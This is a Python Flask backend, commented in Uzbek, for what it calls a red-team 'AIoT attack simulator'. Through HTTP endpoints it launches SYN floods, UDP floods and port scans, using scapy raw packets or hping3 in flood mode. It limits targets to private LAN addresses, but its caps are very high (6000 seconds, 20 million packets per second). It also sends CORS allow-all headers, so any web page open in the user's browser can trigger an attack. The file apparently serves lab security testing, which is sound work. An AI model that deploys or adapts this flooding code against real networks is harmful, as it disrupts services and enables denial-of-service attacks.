"""
AIoT Hujum Simulyatori (Red Team) - Flask backend
FAQAT O'ZINGIZGA TEGISHLI yoki ruxsat berilgan lokal tarmoqda ishlating.
Xavfsizlik: faqat PRIVATE (lokal) IP manzillarga ruxsat beriladi, davomiylik va
intensivlik cheklangan. Boshqa (ommaviy internet) IP ga yuborishga ruxsat YO'Q.

Ishga tushirish:  sudo venv/bin/python app.py   (port 5001)
"""
import os, time, random, shlex, shutil, subprocess, threading, ipaddress, itertools
from flask import Flask, jsonify, request

MAX_DURATION = 6000        # soniya, bitta hujum uchun qattiq chegara
MAX_PPS = 20000000          # soniyadagi maksimal paket soni (himoya uchun chegara)
app = Flask(__name__)
STATE = {"running": False, "thread": None, "stop": False, "sent": 0, "target": "", "kind": "", "engine": "", "proc": None, "log": []}
lock = threading.Lock()


@app.after_request
def cors(r):
    r.headers.update({"Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "Content-Type",
                      "Access-Control-Allow-Methods": "GET,POST,OPTIONS"})
    return r


def is_allowed(ip):
    """Faqat lokal (RFC1918) manzillarga ruxsat: ommaviy internetga yuborish taqiqlanadi."""
    try:
        a = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return a.is_private and not a.is_loopback


def log(msg):
    with lock:
        STATE["log"].insert(0, {"t": time.strftime("%H:%M:%S"), "msg": msg})
        STATE["log"] = STATE["log"][:50]


def run_attack(target, kind, duration, pps):
    from scapy.all import IP, TCP, UDP, RandShort, conf
    duration = min(duration, MAX_DURATION)
    pps = min(pps, MAX_PPS)
    sock = conf.L3socket()
    log(f"Boshlandi [scapy]: {kind} -> {target}, {duration}s, maqsad ~{pps} paket/s")
    t0 = time.time()
    ports = itertools.cycle(range(1, 1025)) if kind == "scan" else None
    sent = 0
    delay = 1.0 / pps if pps > 0 else 0
    next_report = t0 + 1
    try:
        while time.time() - t0 < duration:
            with lock:
                if STATE["stop"]:
                    break
            try:
                if kind == "scan":
                    pkt = IP(dst=target) / TCP(sport=RandShort(), dport=next(ports), flags="S")
                elif kind == "syn_flood":
                    pkt = IP(dst=target) / TCP(sport=RandShort(), dport=80, flags="S")
                else:
                    pkt = IP(dst=target) / UDP(sport=RandShort(), dport=53) / (b"X" * 40)
                sock.send(pkt)
                sent += 1
            except Exception as e:
                log(f"Xato: {e}")
                break
            with lock:
                STATE["sent"] = sent
            if time.time() >= next_report:
                log(f"... {sent} paket yuborildi")
                next_report += 1
            if delay:
                time.sleep(delay)
    finally:
        sock.close()
    real_pps = sent / max(time.time() - t0, 0.001)
    log(f"Tugadi [scapy]: {sent} ta paket yuborildi ({target}), haqiqiy tezlik ~{real_pps:.0f} paket/s")
    with lock:
        STATE.update(running=False, stop=False)


# --- hping3 integratsiyasi: Parrot OS'da tayyor turgan, rasmiy tarmoq sinov vositasi ---
# Bizning o'z scapy kodimiz o'rniga, endi haqiqiy, keng tan olingan vosita orqali ham yuborish mumkin.
MAX_COUNT = 20000000   # -c bilan berilgan aniq paket soni uchun ham qattiq shift (xavfsizlik)

def _hping_rate_flags(count):
    # count berilsa: -c (aniq son) + -i u1000 (1000 paket/s interval) -> o'zi aniq sondan keyin to'xtaydi.
    #   MUHIM: hping3'da --flood bilan -c birga ishlatilsa, -c e'tiborsiz qoldiriladi (sinab ko'rilgan),
    #   shuning uchun aniq son kerak bo'lganda --flood EMAS, -i (interval) ishlatiladi.
    # count berilmasa: --flood (eng tez, lekin faqat vaqt - timeout - bilan cheklanadi)
    if count:
        return ["-c", str(min(count, MAX_COUNT)), "-i", "u1000"]
    return ["--flood"]

HPING3_CMD = {
    "scan":       lambda t, count: ["hping3", "--scan", "1-1024", "-S", "-q", t],
    "syn_flood":  lambda t, count: ["hping3", "-S", "-p", "80", "-q", "-d", "40", *_hping_rate_flags(count), t],
    "udp_flood":  lambda t, count: ["hping3", "-2", "-p", "53", "-q", "-d", "40", *_hping_rate_flags(count), t],
}


def run_attack_hping3(target, kind, duration, count=0):
    duration = min(duration, MAX_DURATION)
    if shutil.which("hping3") is None:
        log("Xato: hping3 o'rnatilmagan. O'rnatish: sudo apt install hping3")
        with lock:
            STATE.update(running=False, stop=False)
        return
    # 'timeout' - backstop: count bilan ishlasa ham, biror sabab bilan to'xtamay qolsa, baribir majburan o'chiradi
    cmd = ["timeout", str(duration)] + HPING3_CMD[kind](target, count)
    log(f"Boshlandi [hping3]: {' '.join(shlex.quote(c) for c in cmd)}"
        + (f" (maqsad: {min(count, MAX_COUNT)} ta paket)" if count else " (vaqt bilan cheklangan, --flood)"))
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        with lock:
            STATE["proc"] = proc
        for line in proc.stdout:
            line = line.strip()
            if line:
                log(line)
            with lock:
                if STATE["stop"] and proc.poll() is None:
                    proc.terminate()
        proc.wait()
        log(f"Tugadi [hping3]: jarayon kodi {proc.returncode} ({target})")
    except Exception as e:
        log(f"hping3 xatosi: {e}")
    with lock:
        STATE.update(running=False, stop=False, proc=None)


@app.get("/api/status")
def status():
    with lock:
        return jsonify(running=STATE["running"], sent=STATE["sent"], target=STATE["target"],
                       kind=STATE["kind"], engine=STATE["engine"], log=STATE["log"])


@app.get("/api/engines")
def engines():
    return jsonify(hping3=shutil.which("hping3") is not None)


@app.post("/api/start")
def start():
    d = request.get_json(silent=True) or {}
    target, kind = str(d.get("target", "")).strip(), d.get("kind", "scan")
    engine = d.get("engine", "scapy")
    duration, pps = int(d.get("duration", 15)), int(d.get("pps", 150))
    count = int(d.get("count", 0) or 0)
    if kind not in ("scan", "syn_flood", "udp_flood"):
        return jsonify(error="Noto'g'ri hujum turi"), 400
    if engine not in ("scapy", "hping3"):
        return jsonify(error="Noto'g'ri vosita (engine)"), 400
    if not is_allowed(target):
        return jsonify(error="Faqat LOKAL (192.168.x.x, 10.x.x.x, 172.16-31.x.x) manzillarga ruxsat berilgan."), 400
    with lock:
        if STATE["running"]:
            return jsonify(error="Hujum allaqachon ishlayapti, avval to'xtating."), 409
        STATE.update(running=True, stop=False, sent=0, target=target, kind=kind, engine=engine)
    # hping3'ning --scan rejimi ba'zi tizimlarda ichki xotira xatosiga (buffer overflow) uchraydi
    # (hping3'ning o'z nuqsoni, bizning kodimiz emas) - shuning uchun port skanerlash har doim
    # bizning barqaror scapy kodimiz orqali bajariladi, hping3 faqat flood turlari uchun ishlatiladi.
    if engine == "hping3" and kind != "scan":
        th = threading.Thread(target=run_attack_hping3, args=(target, kind, duration, count), daemon=True)
    else:
        if engine == "hping3":
            log("Eslatma: hping3'ning port-skanerlash rejimi beqaror (ma'lum nuqson), shuning uchun bu turda avtomatik scapy ishlatiladi.")
        th = threading.Thread(target=run_attack, args=(target, kind, duration, pps), daemon=True)
    STATE["thread"] = th
    th.start()
    return jsonify(ok=True)


@app.post("/api/stop")
def stop():
    with lock:
        STATE["stop"] = True
        if STATE["proc"] is not None and STATE["proc"].poll() is None:
            STATE["proc"].terminate()
    return jsonify(ok=True)


if __name__ == "__main__":
    print("[+] Hujum simulyatori: http://127.0.0.1:5001  (FAQAT o'z tarmog'ingizda ishlating)")
    app.run(host="127.0.0.1", port=5001, debug=False, threaded=True)
